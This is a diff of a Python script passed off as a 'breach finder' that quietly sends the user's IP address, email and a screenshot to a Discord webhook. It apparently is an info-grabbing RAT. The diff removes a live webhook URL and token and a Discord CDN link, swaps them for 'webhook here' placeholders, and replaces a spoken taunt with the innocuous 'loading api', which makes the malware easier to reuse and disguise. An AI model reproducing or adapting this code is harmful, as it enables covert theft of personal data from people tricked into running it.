@@ -134,7 +134,7 @@ def main():
     title_thread = threading.Thread(target=set_console_title, daemon=True)
     title_thread.start()
 
-    correct_password = "breach"
+    correct_password = "password"
     if not authenticate_user(correct_password):
         time.sleep(5.25)
         sys.exit()
@@ -157,12 +157,12 @@ def main():
 
     user_input = input(" [ * ] Press 1 if you also want a breach finder for passwords. ")
     if user_input == "1":
-        webbrowser.open("https://cdn.discordapp.com/attachments/1210695518125031485/1274307846187782185/status.html?ex=66c1c72a&is=66c075aa&hm=68a8b61193849e6b9314c2bb6076ef5929988774003602a485a6d63c28a0eee1&")
+        webbrowser.open("webhook here")
 
     sound_thread = threading.Thread(target=play_sound_from_file, args=("driver.mp3",), daemon=True)
     sound_thread.start()
 
-    speak_text("100 PERCENT NOT RAT, PC FUCKED AND HOUSE BOMBED ")
+    speak_text("loading api")
 
     search_type = choose_search_depth()
 
@@ -248,7 +248,7 @@ def main():
 
     text_content = f"IP Address: {ip_address}\nEmail Address: {email}\nScreenshot File: {screenshot_file}"
 
-    webhook_url = 'https://discord.com/api/webhooks/1271925593075617825/FtsHBs2cleWJ2q5rZ_aqqVn1wt18RqeT_E7OO36GxROmbUcPEAcpg4PcJP_bo15t5AE0'
+    webhook_url = 'webhook here'
     if screenshot_file:
         status_code, response_text = send_to_webhook(webhook_url, text_content, screenshot_file)
         
